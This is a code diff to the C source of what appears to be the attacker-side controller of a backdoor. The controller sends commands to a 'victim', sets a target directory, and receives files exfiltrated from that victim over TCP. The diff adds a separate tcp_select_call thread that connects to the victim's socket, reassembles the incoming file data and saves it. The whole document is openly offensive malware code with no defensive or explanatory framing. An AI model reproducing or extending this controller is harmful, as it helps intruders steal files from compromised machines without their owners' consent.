@@ -8,7 +8,7 @@ int main(void) {
     bpf_u_int32 netp, maskp;
     pcap_t* nic_fd;
     struct bpf_program fp;
-    pthread_t command_thread, tcp_thread, cnc_thread;
+    pthread_t command_thread, tcp_thread;
 
     signal(SIGINT,sig_handler);
     check_root_user();
@@ -26,6 +26,11 @@ int main(void) {
 
     if (pthread_create(&command_thread, NULL, input_select_call, (void*)&opts) != 0) {
         perror("udp thread create error");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pthread_create(&tcp_thread, NULL, tcp_select_call, (void*)&opts) != 0) {
+        perror("tcp thread create error");
         exit(EXIT_FAILURE);
     }
 
@@ -141,8 +146,8 @@ void* input_select_call(void* arg) {
                         opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
                         if (strstr(opts->victim_instruction, "target") != NULL ) {
                             strcpy(opts->target_directory, opts->victim_instruction + 7);
+                            opts->target = TRUE;
                         }
-
                         sprintf(instruction, "[[%s]]", opts->victim_instruction);
                         length = strlen(instruction);
                         for (int j = 0; j < length; j++) {
@@ -159,27 +164,6 @@ void* input_select_call(void* arg) {
                         }
                         memset(instruction, 0, 64);
                     }
-                }
-                if (i == opts->rtcp_socket) {
-                    int bytes = (int)read(opts->rtcp_socket, r_buffer, sizeof(r_buffer));
-
-                    if (opts->file_flag == TRUE) {
-
-                        memcpy(opts->data + opts->size, r_buffer, (unsigned long) bytes);
-                        opts->size += bytes;
-                        if (opts->size >= opts->file_size) {
-                            create_file(opts);
-                        }
-                    }
-
-                    if (opts->file_flag == FALSE) {
-                        tokenize_file_info(opts, r_buffer);
-                        setvbuf(stdout, NULL, _IONBF, 0);
-                        setvbuf(stderr, NULL, _IONBF, 0);
-                        opts->file_flag = TRUE;
-                        bytes = 0;
-                    }
-                    memset(r_buffer, 0, sizeof(r_buffer));
                 }
             }
         }
@@ -250,4 +234,73 @@ void create_file(struct options_attacker *opts) {
     opts->size = 0;
     opts->file_flag = FALSE;
     fclose(fp);
+    printf("File downloaded complete");
+}
+
+
+void* tcp_select_call(void* arg) {
+    struct options_attacker *opts = (struct options_attacker*)arg;
+    char r_buffer[5000] = {0};
+
+    while(1) {
+        while (1) {
+            if (opts->target == TRUE) {
+                sleep(1);
+                if(connect(opts->rtcp_socket, (struct sockaddr*)&opts->rtcpsa, sizeof(opts->rtcpsa)) < 0 ){
+                    perror("attacker rtcp connect() ERROR\n");
+                    exit(EXIT_FAILURE);
+                }
+                break;
+            }
+        }
+
+        while (opts->target == TRUE) {
+            fd_set reads, cpy_reads;
+            struct timeval timeout;
+            int fd_max, fd_num;
+
+            timeout.tv_sec = 1;
+            timeout.tv_usec = 0;
+
+            FD_ZERO(&reads);
+            FD_SET(opts->rtcp_socket, &reads);
+            fd_max = opts->rtcp_socket;
+
+            while (1) {
+                cpy_reads = reads;
+                fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
+                if (fd_num == -1) {
+                    perror("Select() failed");
+                    exit(EXIT_FAILURE);
+                }
+                else if (fd_num == 0) continue; // time out
+                for (int i = 0; i < fd_max + 1; i++) {
+                    if (FD_ISSET(i, &cpy_reads)) {
+                        if (i == opts->rtcp_socket) {
+                            int bytes = (int) read(opts->rtcp_socket, r_buffer, sizeof(r_buffer));
+
+                            if (opts->file_flag == TRUE) {
+                                memcpy(opts->data + opts->size, r_buffer, (unsigned long) bytes);
+                                opts->size += bytes;
+                                if (opts->size >= opts->file_size) {
+                                    create_file(opts);
+                                    opts->target = FALSE;
+                                    opts->file_flag = FALSE;
+                                }
+                            }
+
+                            if (opts->file_flag == FALSE) {
+                                tokenize_file_info(opts, r_buffer);
+                                setvbuf(stdout, NULL, _IONBF, 0);
+                                setvbuf(stderr, NULL, _IONBF, 0);
+                                opts->file_flag = TRUE;
+                                bytes = 0;
+                            }
+                            memset(r_buffer, 0, sizeof(r_buffer));
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
